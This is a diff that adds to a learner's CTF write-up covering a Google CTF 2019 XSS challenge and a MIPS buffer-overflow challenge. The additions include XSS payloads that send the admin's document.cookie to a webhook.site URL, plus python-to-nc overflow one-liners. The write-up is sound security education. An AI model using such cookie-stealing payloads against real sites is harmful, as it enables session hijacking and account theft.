@@ -77,11 +77,57 @@
 
 # [easier - task: web] Government Agriculture Network
 * Link: https://govagriculture.web.ctfcompetition.com/
-* Opening up the page shows us a textfield right at the top that allows us to enter some text, press `Submit`, and we get a message that "Your post was submitted for review. Administator will take a look shortly."
+* Reference link: https://ctftime.org/writeup/15943
+* Opening up the page shows us a page with a textfield and some pictures:
+![](/screenshots/google-beginner-govt-agri-network/initialPage.jpg)
+* The textfield right at the top that allows us to enter some text, press `Submit`, and we get a message that "Your post was submitted for review. Administator will take a look shortly." It seems like no matter whatever input we submitted, we would get the same admin-will-review-this-post message.
+![](/screenshots/google-beginner-govt-agri-network/postSubmitted.jpg)
 * On the top-right-hand corner, we see `Admin` which directs us to `/admin`, which really actually only directs us back to the original link itself. Hmm.
 * At the bottom of the page we see an apparent post titled "New acquisition on our farms" and dated "May 15, 2019" with two images - one of a yellow calliflower amongst green leaves and a lady eating a calliflower with a glass of wine in her hand, and a plate of calliflowers before her.
+* I downloaded the 2 images and found some photo metadata in `califlower.jpg`, but nothing in `eating.png`. Running `strings` against both files turn up nothing as well.
 * I opened up BurpSuite, and intercepted the POST request made when the `Submit` button was hit when we "attempt to create a new post". Only `postContents=` was in the body content - no cookies, whatsoever.
 * Next, I intercepted the GET request for `/admin`, and saw that the response was a `303 See Other`. The next request served up was a GET request for the main page, i.e. `/`.
 * I read from this [article](https://airbrake.io/blog/http-errors/303-see-other) that the `303` code was typically provided in response to a `POST`, `PUT`, or `DELETE` HTTP method request. However, that was not the case here.
 * I tried to access `/see-other`, `/seeother`, `/administrator` and `/login`, but they all turned up nothing.
+* We head to `/static` and find `images/` and `styles/`, but there were nothing much in there, save for 2 images which we saw and a .css file.
+* **Learning point**: When the page said that our post was submitted for review, what it also meant was that we should be looking at XSS.
+* I created a canary token with this [site](https://canarytokens.org/generate). I selected "Web bug / URL token" for my token and provided a webhook URL that was generated [here](https://webhook.site/).
+* Next, I submitted `<img src="http://canarytokens.com/static/images/about/[REDACTED]/post.jsp"/>` as the new post on the website, and found that on our webhook site that a request was indeed made. This meant that indeed an "administrator" was reviewing our content.
+* **Note**: The above 2 steps (i.e. use of canary token) are additional steps taken just to understand how this all works out. We could have simply created a webhook and used it only.
+* Next, to get the cookie, we have at least 2 ways of doing so:
+1. `<script>window.location="https://webhook.site/26f4b8ab-b4e5-4a21-9491-35dda41a7775?cookie=" + document.cookie</script>`
+2. `<img src=x onerror="window.location='https://webhook.site/26f4b8ab-b4e5-4a21-9491-35dda41a7775?cookie=' + document.cookie"/>`
+* The whole idea is to get the "administrator" to visit our site and attach his cookie while doing so.
+* And our flag is found within the cookie - `flag=CTF{8aaa2f34b392b415601804c2f5f0f24e}`!
+![](/screenshots/google-beginner-govt-agri-network/flag.jpg)
+* I had definitely learnt a lot from this challenge - I never knew something like `webhook.site` existed, which would allow us to do many things (one of which is stealing cookies). I knew the theory of it but having to do the practical was definitely enriching.
+
+# [easier - task: pwn] Stop Gan
+* Reference link:
+1. https://amar-laksh.github.io/2019/06/29/Google-CTF-Writeups-Part-1.html#stopgan
+2. https://github.com/Dvd848/CTFs/blob/master/2019_GoogleCTF_BQ/STOP_GAN.md
+* There is a file for us to [download](https://storage.googleapis.com/gctf-2019-attachments/4a8becb637ed2b45e247d482ea9df123eb01115fc33583c2fa0e4a69b760af4a) - `4a8becb637ed2b45e247d482ea9df123eb01115fc33583c2fa0e4a69b760af4a.zip`.
+* Within the zip file we find 2 files - `bof` and `console.c`.
+* `bof` is an ELF 32-bit LSB executable.
+* **Learning point**: I learnt from a reference link that we should always run `checksec` in addition to `file` in a pwn challenge to "understand the binary vulnerabilities present". We already know about the latter, but the former was something new.
+* We have already got `checksec` installed, so we ran `checksec --file bof`, which tells us that there is no protections on `bof`:
+![](/screenshots/google-beginner-bof/checksec.jpg)
+* **Learning point**: I never saw RELRO before, but found out that it stands for Relocation Read-Only, and is a method to harden ELF binaries in Linux.
+* `console.c` contains C language code. I compiled the code using `gcc console.c -o console -static -s` as mentioned within the file, and ran `./console`. However, when I typed in `run`, I got the error that "/usr/bin/qemu-mipsel-static: not found".
+* Note: It turns out that if we were to overflow `./console`, we would have gotten the message `***CRASH***could not open flag`, which would then prompt one to connect to the official server.
+* Note2: I learnt that `bof` is a MIPS binary that needed to be executed with the help of an emulator - qemu - which is why we see that file name in the error that we got.
+* We are also given `buffer-overflow.ctfcompetition.com 1337`, where I used `nc` to connect to. I found out that when we were connected, the program that was running was the same as `./console`. This time, I managed to type in `run` successfully. Next, I entered some random input, which gave us "Cauliflower systems never crash >>".
+![](/screenshots/google-beginner-bof/noCrash.jpg)
+* Turns out that our input length is probably too small. Without wanting to waste more time, we should use python instead to generate an input of larger length: `python -c "print 'run\n' + 'A' * 999" | nc buffer-overflow.ctfcompetition.com 1337`.
+* Alternatively, instead of using the newline character after `run`, this would also work: `python -c "print 'run'; print 'A' * 999" | nc buffer-overflow.ctfcompetition.com 1337`.
+* Note: We could not have simply generated our long string of 'A's at the start of the print statement because we would have needed to submit `run` to the program first.
+* Note2: I did not find out the exact number that would trigger the first flag, but the smallest I tried was 300.
+![](/screenshots/google-beginner-bof/noCrash.jpg)
+* And thus we have got our first flag - `CTF{Why_does_cauliflower_threaten_us}`! As mentioned in the first few lines of the program program, crashing it will trigger the first flag.
+* To obtain the second flag, we needed to control the crash. Time to look further into the `bof` file that was given to us.
+* Using `nm` with `grep`, we are able to find out an interesting function named `local_flag`:
+![](/screenshots/google-beginner-bof/localFlagFunction.jpg)
+* **Learning point**: `nm` is used to list symbols from object files.
+* Note: Using `strings bof | grep flag` gives us a couple more results than `nm`. Though `local_flag` is found within the output, we would not have been sure if this name refers to a function, if we were to run this command alone.
+* Since we would never be able to get to the interesting function by ordinary means, we would have to redirect the return address to it.
 * To-be-continued...
